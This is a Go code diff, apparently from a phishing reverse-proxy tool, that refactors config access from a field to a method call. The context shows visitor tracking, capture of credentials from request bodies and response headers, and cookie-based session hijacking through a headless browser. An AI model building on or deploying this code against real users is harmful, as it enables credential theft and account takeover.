@@ -135,13 +135,13 @@ func Load(s *session.Session) (m *Tracker, err error) {
 
 	m = &Tracker{
 		SessionModule: session.NewSessionModule(Name, s),
-		Enabled:       s.Config.Tracking.Enabled,
+		Enabled:       s.Config().Tracking.Enabled,
 		Header:        "If-Range",                  // Default HTTP Header
 		LandingHeader: "If-LandingHeader-Redirect", // Default LandingHeader HTTP Header
-		// Type:          strings.ToLower(s.Config.Tracking.Trace.Landing.Type),
+		// Type:          strings.ToLower(s.Config().Tracking.Trace.Landing.Type),
 	}
 
-	switch strings.ToLower(s.Config.Tracking.Trace.Landing.Type) {
+	switch strings.ToLower(s.Config().Tracking.Trace.Landing.Type) {
 	case "path":
 		m.Type = LandingPath
 
@@ -155,17 +155,17 @@ func Load(s *session.Session) (m *Tracker, err error) {
 		return
 	}
 
-	config := s.Config.Tracking.Trace
+	config := s.Config().Tracking.Trace
 	m.Identifier = config.Identifier
 
 	// Set tracking header
-	if s.Config.Tracking.Trace.Header != "" {
-		m.Header = s.Config.Tracking.Trace.Header
+	if s.Config().Tracking.Trace.Header != "" {
+		m.Header = s.Config().Tracking.Trace.Header
 	}
 
 	// Set landing header
-	if s.Config.Tracking.Trace.Landing.Header != "" {
-		m.LandingHeader = s.Config.Tracking.Trace.Landing.Header
+	if s.Config().Tracking.Trace.Landing.Header != "" {
+		m.LandingHeader = s.Config().Tracking.Trace.Landing.Header
 	}
 
 	// Default Trace format is UUIDv4
@@ -310,7 +310,7 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	// Tracing types: Path || Query (default)
 	//
 	if module.Type == LandingPath {
-		tr := module.Session.Config.Tracking
+		tr := module.Session.Config().Tracking
 
 		pathRegex := strings.Replace(tr.Trace.Identifier, "_", "/", -1) + tr.Trace.ValidatorRegex
 		re := regexp.MustCompile(pathRegex)
@@ -391,8 +391,8 @@ func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
 	}
 
 	if module.Type == LandingPath && isTrackedPath {
-		if module.Session.Config.Tracking.Trace.Landing.RedirectTo != "" {
-			targetURL, err := url.ParseRequestURI(module.Session.Config.Tracking.Trace.Landing.RedirectTo)
+		if module.Session.Config().Tracking.Trace.Landing.RedirectTo != "" {
+			targetURL, err := url.ParseRequestURI(module.Session.Config().Tracking.Trace.Landing.RedirectTo)
 			if err != nil {
 				log.Error("invalid redirect URL after landing path: %s", err)
 			} else {
@@ -429,9 +429,9 @@ func (module *Tracker) TrackResponse(response *http.Response) (t *Trace) {
 		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
 		t = module.makeTrace(response.Request.Header.Get(module.Header))
 		if t.IsValid() {
-			cookieDomain := module.Session.Config.Proxy.Phishing
-			if module.Session.Config.Tracking.Trace.Domain != "" {
-				cookieDomain = module.Session.Config.Tracking.Trace.Domain
+			cookieDomain := module.Session.Config().Proxy.Phishing
+			if module.Session.Config().Tracking.Trace.Domain != "" {
+				cookieDomain = module.Session.Config().Tracking.Trace.Domain
 			}
 			module.Info("Setting tracking cookie for domain: %s", cookieDomain)
 
@@ -466,7 +466,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 
 	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
 	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
-	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
+	for _, c := range t.Session.Config().Tracking.Secrets.Paths {
 		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
 		matched := false
 		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
@@ -476,7 +476,7 @@ func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bo
 		}
 
 		if matched {
-			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
+			for _, p := range t.Session.Config().Tracking.Secrets.Patterns {
 
 				// Case *sensitive* matching
 				if strings.Contains(body, p.Matching) {
@@ -538,7 +538,7 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 
 	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
 	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
-	for _, c := range t.Session.Config.Tracking.Secrets.Paths {
+	for _, c := range t.Session.Config().Tracking.Secrets.Paths {
 		// If the URL is a wildcard, then we need to check if the request URL matches the wildcard
 		matched := false
 		if strings.HasPrefix(c, "^") && strings.HasSuffix(c, "$") {
@@ -548,7 +548,7 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 		}
 
 		if matched {
-			for _, p := range t.Session.Config.Tracking.Secrets.Patterns {
+			for _, p := range t.Session.Config().Tracking.Secrets.Patterns {
 				for k, v := range response.Header {
 
 					// generate the header string:
@@ -595,7 +595,7 @@ func (t *Trace) ExtractCredentialsFromResponseHeaders(response *http.Response) (
 // pass the cookies in the CookieJar to necrobrowser to hijack the session
 func (t *Trace) HijackSession(request *http.Request) (err error) {
 
-	if !t.Session.Config.Necrobrowser.Enabled {
+	if !t.Session.Config().Necrobrowser.Enabled {
 		return
 	}
 
@@ -606,7 +606,7 @@ func (t *Trace) HijackSession(request *http.Request) (err error) {
 		return
 	}
 
-	for _, c := range t.Session.Config.Necrobrowser.SensitiveLocations.AuthSession {
+	for _, c := range t.Session.Config().Necrobrowser.SensitiveLocations.AuthSession {
 		if request.URL.Path == c {
 			getSession = true
 			break
